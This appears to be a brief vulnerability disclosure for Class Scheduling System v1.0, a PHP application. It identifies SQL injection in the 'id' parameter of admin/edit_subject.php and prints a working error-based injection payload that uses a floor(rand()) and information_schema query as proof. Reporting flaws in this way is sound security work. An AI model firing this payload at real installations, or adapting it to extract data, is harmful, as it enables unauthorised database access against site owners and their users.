# Class Scheduling System v1.0 has SQL injection

BUG_Author：zhulielie

Website source address: https://www.sourcecodester.com/php/5175/class-scheduling-system.html

Vulnerability File: /online_class_scheduling_system/admin/edit_subject.php

Vulnerability location: /online_class_scheduling_system/admin/edit_subject.php?id

Payload: id=23' and (select 1 from(select count(*),concat(0x71727374,(select (elt(333=333,1))),0x65666768,floor(rand(0)*2))x from information_schema.plugins group by x)x) and 'b'='b

Error-based SQL injection is successful, proving the existence of SQL injection vulnerabilities

![image](https://github.com/zhulielie/CVEReport/blob/main/sql.png)
